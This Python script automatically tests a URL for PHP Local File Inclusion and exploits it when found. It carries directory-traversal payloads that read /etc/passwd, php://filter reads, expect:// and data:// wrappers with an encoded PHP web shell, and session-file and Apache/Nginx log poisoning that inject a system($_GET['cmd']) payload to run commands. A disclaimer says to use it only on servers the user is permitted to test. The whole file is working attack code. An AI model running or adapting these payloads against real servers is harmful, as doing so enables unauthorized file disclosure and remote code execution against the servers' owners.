#!/usr/bin/env python3

# CAUTION this script doesn't check for Remote File Inclusion (RFI)

# DISCLAIMER
# This script is not stealthy and will leave traces behind.
# ONLY test this in a server you have permission to do it!!!!!!!

# sources -->
# http://www.compciv.org/guides/python/how-tos/creating-proper-url-query-strings/


import requests
import re
from urllib.request import urlopen
from urllib.error import HTTPError
from urllib.error import URLError
from urllib.parse import quote
from termcolor import colored



# The quote method automatically url encodes the string
linux_dirTraversal = [quote("../../../../../../.."), quote("/../../../../../../.."), quote("....//....//....//....//....//....//..../"), quote("//....//....//....//....//....//....//..../")]
path1 = quote("/etc/passwd")
path2 = quote("/etc/passwd%00")

# Filter
filterPaths = [quote("/etc/passwd"), quote("index"), quote("index.php"), quote("index.html")]
filterBase = quote("php://filter/read=convert.base64-encode/resource=")

# Headers
phpHeaders1 = quote("expect://id")
# This is without url encoding beacause it encodes also the base64 and the server doesn't like that
phpHeaders2 = "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id"

# PHPSESSID Cookie
cookiePath = "/var/lib/php/sessions/sess_"

# payload for RCE
payload = "<?php system($_GET['cmd']); ?>"




# Checks if the url is valid
def urlCheck(url):
	try:
		openn = urlopen(url)
		return True	
	except Exception as e:
		print(colored('[-]', 'red', attrs=['bold']) + ' Not a valid url for LFI, ', e)
		return False
		


		
# Strips all HTML tags from the HTTP response	
def stripHtmlTags(t):
	htmlchars = re.compile('<.*?>')
	clean = re.sub(htmlchars, '', t)
	return clean

	
	

# Checks for directory traversal
def dirTraversalCheck(url):
	for i in linux_dirTraversal:
		compUrl = url + i + path1
		check = urlopen(compUrl)
		response = check.read().decode('utf-8')
		clean = stripHtmlTags(response)
		if 'root:x' in clean.lower():
			print(colored('[+]', 'green', attrs=['bold']) + ' Directory traversal found with ' + compUrl)




def dirTraversalCheck2(url):
	for i in linux_dirTraversal:
		compUrl = url + i + path2
		check = urlopen(compUrl)
		response = check.read().decode('utf-8')
		clean = stripHtmlTags(response)
		if 'root:x' in clean.lower():
			print(colored('[+]', 'green', attrs=['bold']) + ' Directory traversal found with ' + compUrl)
	



# Checks for Remote Code Execution with php headers
def headerCheck1(url):
	compUrl = url + phpHeaders1
	check = urlopen(compUrl)
	response = check.read().decode('utf-8')
	clean = stripHtmlTags(response)
	if 'uid=' in clean.lower():
		print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with ' + compUrl)
		
		
		
		
def headerCheck2(url):
	compUrl = url + phpHeaders2
	check = urlopen(compUrl)
	response = check.read().decode('utf-8')
	clean = stripHtmlTags(response)
	if 'uid=' in response.lower():
		print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with ' + compUrl)


	
	
# Checks if it can retrieve files with the php filter	
def filterCheck(url):
	for y in filterPaths:
		compUrl = url + filterBase + y
		check = urlopen(compUrl)
		response = check.read().decode('utf-8')
		clean = stripHtmlTags(response)
		words = clean.split()
		for i in words:
			if i.endswith('='):
				print(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl)			




# Checks if the PHPSESSID cookie can be exploited
def cookieCheck(url):
	s = requests.Session()
	session = s.get(url)
	cookies = session.cookies.get_dict()
	for i in cookies:
		if 'phpsessid' in i.lower():
			# it gets the value of the cookie
			value = session.cookies[i]
			#send the payload to see if there is RCE
			newUrl = url + payload
			s.get(newUrl)
			# open the file to find if the command worked
			compUrl = url + cookiePath + value + "&cmd=id"
			check2 = urlopen(compUrl)
			response = check2.read().decode('utf-8')
			clean = stripHtmlTags(response)
			if 'uid='  in clean.lower():
				print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + cookiePath + '[cookie value] can be poisoned')



def logPoisonCheck(url):
	headers = {"User-Agent": payload}
	openn = urlopen(url)
	sendHeader = requests.get(url, headers=headers)
	# checks the type of the server
	if "apache" in openn.getheader('Server').lower():
		# Apache logs
		logPath = [quote("/var/log/apache2/access.log"), quote("/var/log/sshd.log"), quote("/var/log/mail"), quote("/var/log/vsftpd.log"), quote("/proc/self/environ")]
		for q in linux_dirTraversal:
			for i in logPath:
				pathth = url + q + i
				compUrl = pathth + "&cmd=id"
				check = urlopen(compUrl)
				response = check.read().decode('utf-8')
				clean = stripHtmlTags(response)
				if "uid=" in clean.lower():
					print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathth)	
	
	elif "nginx" in openn.getheader('Server').lower():
		# Nginx logs
		log = [quote("/var/log/nginx/error.log"), quote("/var/log/nginx/access.log")]
		for y in linux_dirTraversal:
			for i in log:
				pathh = url + y + i
				compUrl = pathh + "&cmd=id"
				check = urlopen(compUrl)
				response = check.read().decode('utf-8')
				clean = stripHtmlTags(response)
				if "uid=" in clean.lower():
					print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathh)
	
	else:
		print("[-] A directory traversal attack is VALID but the server type " + url.getheader('Server') + " is not supported!!!")




	
def main():
	try:
		print(colored("This script doesn't check for Remote File Inclusion (RFI)", 'blue'))
		print(colored("If it doesn't show any result that means it didn't find anything!!!", 'blue'))
		url = input('Please enter URL: ')
		if urlCheck(url):
			dirTraversalCheck(url)
			dirTraversalCheck2(url)
			headerCheck1(url)
			headerCheck2(url)
			filterCheck(url)
			cookieCheck(url)
			logPoisonCheck(url)
	except KeyboardInterrupt:
		print('\nExiting...')
	
	
	
	
if __name__ == '__main__':
	main()

